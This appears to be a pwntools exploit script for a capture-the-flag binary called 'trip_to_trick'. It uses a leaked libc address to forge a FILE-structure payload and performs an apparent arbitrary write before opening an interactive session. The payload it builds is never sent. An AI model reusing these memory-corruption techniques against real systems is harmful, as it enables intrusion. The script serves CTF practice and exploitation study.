from pwn import *
io=process("./trip_to_trick")
gdb.attach(io)
io.recvuntil("gift : ")
libc_leak = int(io.recv(14),16)
log.info("Libc @ "+str(hex(libc_leak)))
libc_base=libc_leak-0x52fd0

magic=0x00000000fbad2887
fir=libc_base+0x1e57e3 #6
secon=fir+1  #1   # 4 0  
thir = libc_base+0x1e4a00  # 1
# 1 -1 0 
four = libc_base+0x1e7580
# -1 0 
five=libc_base+0x1e48c0
# 0 0 0 ffffffff 0 0
target=0xaaaaaaaaaaaaaaaa

payload= p64(magic)+p64(fir)*7+p64(thir) + p64(1)+p64(0xffffffffffffffff)+p64(four) + p64(0xffffffffffffffff)+p64(0)+p64(five)+p64(0)*3 +p64(0xffffffff)+p64(0)*2+p64(target)
tar=libc_base+0x1e5798
val=libc_base+0x1e5740

io.sendlineafter("1 : ",str(tar))
io.sendline(str(val))

io.interactive()
